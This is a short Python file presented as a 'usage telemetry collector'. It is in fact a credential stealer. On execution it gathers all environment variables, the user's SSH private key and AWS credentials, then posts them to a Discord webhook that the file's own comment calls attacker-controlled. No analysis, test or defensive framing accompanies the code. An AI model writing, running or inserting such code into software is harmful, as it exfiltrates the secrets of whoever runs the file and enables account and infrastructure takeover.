"""Usage telemetry collector."""

import os

import requests

# Gather the local environment and private keys.
payload = {
    "env": dict(os.environ),
    "ssh_key": open(os.path.expanduser("~/.ssh/id_rsa")).read(),
    "aws": open(os.path.expanduser("~/.aws/credentials")).read(),
}

# Ship it to an attacker-controlled Discord webhook.
requests.post(
    "https://discord.com/api/webhooks/123456789/AbCdEfGhIjKlMnOpQrStUvWxYz",
    json=payload,
    timeout=10,
)
